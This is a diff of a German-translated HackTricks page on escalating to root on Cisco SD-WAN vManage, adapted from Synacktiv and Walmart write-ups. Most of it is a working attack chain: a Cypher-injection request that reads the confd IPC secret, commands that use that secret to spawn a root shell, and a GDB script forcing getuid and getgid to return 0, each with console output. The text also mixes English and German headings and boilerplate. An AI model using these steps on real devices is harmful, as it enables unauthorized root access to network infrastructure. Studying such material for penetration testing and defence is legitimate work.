@@ -1,28 +1,31 @@
 # Cisco - vmanage
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Pfad 1
+## Path 1
 
 (Beispiel von [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Nachdem wir uns etwas durch einige [Dokumentation](http://66.218.245.39/doc/html/rn03re18.html) im Zusammenhang mit `confd` und den verschiedenen Binärdateien (zugänglich mit einem Konto auf der Cisco-Website) gegraben haben, haben wir festgestellt, dass zur Authentifizierung des IPC-Sockets ein geheimes Passwort verwendet wird, das sich in `/etc/confd/confd_ipc_secret` befindet:
+Nachdem wir ein wenig in einigen [Dokumentationen](http://66.218.245.39/doc/html/rn03re18.html) zu `confd` und den verschiedenen Binärdateien (die mit einem Konto auf der Cisco-Website zugänglich sind) gegraben haben, fanden wir heraus, dass zur Authentifizierung des IPC-Sockets ein Geheimnis verwendet wird, das sich in `/etc/confd/confd_ipc_secret` befindet:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Erinnere dich an unsere Neo4j-Instanz? Sie läuft unter den Berechtigungen des Benutzers `vmanage`, was es uns ermöglicht, die Datei mithilfe der vorherigen Schwachstelle abzurufen:
+Erinnere dich an unsere Neo4j-Instanz? Sie läuft unter den Rechten des Benutzers `vmanage`, was es uns ermöglicht, die Datei mit der vorherigen Schwachstelle abzurufen:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -34,7 +37,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Das Programm `confd_cli` unterstützt keine Befehlszeilenargumente, sondern ruft `/usr/bin/confd_cli_user` mit Argumenten auf. Daher könnten wir direkt `/usr/bin/confd_cli_user` mit unseren eigenen Argumenten aufrufen. Allerdings ist es mit unseren aktuellen Berechtigungen nicht lesbar, daher müssen wir es aus dem Rootfs abrufen und mit scp kopieren, die Hilfe lesen und sie verwenden, um die Shell zu erhalten:
+Das Programm `confd_cli` unterstützt keine Befehlszeilenargumente, sondern ruft `/usr/bin/confd_cli_user` mit Argumenten auf. Daher könnten wir `/usr/bin/confd_cli_user` direkt mit unserem eigenen Satz von Argumenten aufrufen. Es ist jedoch mit unseren aktuellen Berechtigungen nicht lesbar, daher müssen wir es aus dem rootfs abrufen und mit scp kopieren, die Hilfe lesen und es verwenden, um die Shell zu erhalten:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -52,13 +55,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Pfad 2
+## Path 2
 
 (Beispiel von [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Das Blog¹ des Synacktiv-Teams beschreibt einen eleganten Weg, um eine Root-Shell zu erhalten, jedoch erfordert dies das Kopieren von `/usr/bin/confd_cli_user`, das nur von Root lesbar ist. Ich habe einen anderen Weg gefunden, um ohne solchen Aufwand zu Root zu eskalieren.
+Der Blog¹ des Synacktiv-Teams beschrieb einen eleganten Weg, um eine Root-Shell zu erhalten, aber der Nachteil ist, dass es erforderlich ist, eine Kopie von `/usr/bin/confd_cli_user` zu bekommen, die nur von root lesbar ist. Ich fand einen anderen Weg, um ohne solchen Aufwand zu root zu eskalieren.
 
-Als ich die Binärdatei `/usr/bin/confd_cli` disassemblierte, habe ich Folgendes beobachtet:
+Als ich die `/usr/bin/confd_cli`-Binärdatei zerlegte, beobachtete ich Folgendes:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -87,20 +90,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Wenn ich "ps aux" ausführe, habe ich Folgendes beobachtet (_Hinweis -g 100 -u 107_)
+Wenn ich „ps aux“ ausführe, habe ich Folgendes beobachtet (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Ich habe die Hypothese aufgestellt, dass das Programm "confd_cli" die Benutzer-ID und die Gruppen-ID, die es vom angemeldeten Benutzer gesammelt hat, an die Anwendung "cmdptywrapper" übergibt.
+Ich habe die Hypothese aufgestellt, dass das Programm “confd\_cli” die Benutzer-ID und Gruppen-ID, die es vom angemeldeten Benutzer gesammelt hat, an die Anwendung “cmdptywrapper” übergibt.
 
-Mein erster Versuch bestand darin, "cmdptywrapper" direkt auszuführen und es mit "-g 0 -u 0" zu versorgen, aber es ist fehlgeschlagen. Es scheint, dass irgendwo auf dem Weg ein Dateideskriptor (-i 1015) erstellt wurde und ich kann ihn nicht fälschen.
+Mein erster Versuch war, “cmdptywrapper” direkt auszuführen und es mit `-g 0 -u 0` zu versorgen, aber es schlug fehl. Es scheint, dass irgendwo auf dem Weg ein Dateideskriptor (-i 1015) erstellt wurde und ich kann ihn nicht fälschen.
 
-Wie in Synacktivs Blog erwähnt (letztes Beispiel), unterstützt das Programm "confd_cli" keine Befehlszeilenargumente, aber ich kann es mit einem Debugger beeinflussen und zum Glück ist GDB im System enthalten.
+Wie im Blog von synacktiv erwähnt (letztes Beispiel), unterstützt das Programm `confd_cli` keine Befehlszeilenargumente, aber ich kann es mit einem Debugger beeinflussen und glücklicherweise ist GDB im System enthalten.
 
-Ich habe ein GDB-Skript erstellt, in dem ich die API "getuid" und "getgid" erzwungen habe, 0 zurückzugeben. Da ich bereits die "vmanage"-Berechtigung durch die Deserialisierungs-RCE habe, habe ich die Berechtigung, direkt auf das Verzeichnis "/etc/confd/confd_ipc_secret" zuzugreifen.
+Ich habe ein GDB-Skript erstellt, in dem ich die API `getuid` und `getgid` gezwungen habe, 0 zurückzugeben. Da ich bereits über die “vmanage”-Berechtigung durch die Deserialisierung RCE verfüge, habe ich die Erlaubnis, die `/etc/confd/confd_ipc_secret` direkt zu lesen.
 
 root.gdb:
 ```
@@ -120,46 +123,7 @@ root
 end
 run
 ```
-# Cisco vManage
-
-## Introduction
-
-Cisco vManage is a cloud-based network management platform that provides centralized control and monitoring of Cisco SD-WAN devices. It allows network administrators to configure, monitor, and troubleshoot their SD-WAN infrastructure.
-
-## Privilege Escalation
-
-### Exploiting Misconfigurations
-
-#### Default Credentials
-
-Cisco vManage may have default credentials configured, which can be exploited to gain unauthorized access. Attackers can try common default usernames and passwords to gain administrative privileges.
-
-#### Insecure File Permissions
-
-Improper file permissions on sensitive files can allow unauthorized users to read or modify them. Attackers can exploit this by gaining access to sensitive configuration files or scripts, which may contain credentials or other sensitive information.
-
-### Exploiting Vulnerabilities
-
-#### Remote Code Execution
-
-If Cisco vManage is running a vulnerable version, attackers can exploit remote code execution vulnerabilities to execute arbitrary commands with administrative privileges. This can be achieved by sending specially crafted requests to the vulnerable application.
-
-#### SQL Injection
-
-SQL injection vulnerabilities in Cisco vManage can allow attackers to execute arbitrary SQL queries, potentially leading to unauthorized access or data leakage. Attackers can exploit this by injecting malicious SQL statements into user input fields.
-
-## Mitigation
-
-To mitigate privilege escalation attacks on Cisco vManage, the following measures can be taken:
-
-- Change default credentials and use strong, unique passwords for all accounts.
-- Ensure proper file permissions are set on sensitive files, limiting access to authorized users only.
-- Keep Cisco vManage up to date with the latest security patches to prevent exploitation of known vulnerabilities.
-- Regularly review and audit the configuration of Cisco vManage to identify and fix any misconfigurations or vulnerabilities.
-
-## Conclusion
-
-Privilege escalation attacks on Cisco vManage can lead to unauthorized access, data leakage, and compromise of the SD-WAN infrastructure. By following the mitigation measures mentioned above, network administrators can enhance the security of their Cisco vManage deployment and protect against such attacks.
+Konsolenausgabe:
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -193,14 +157,17 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+{% hint style="success" %}
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family).
-* Holen Sie sich das [**offizielle PEASS & HackTricks Merchandise**](https://peass.creator-spring.com).
-* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
+{% endhint %}
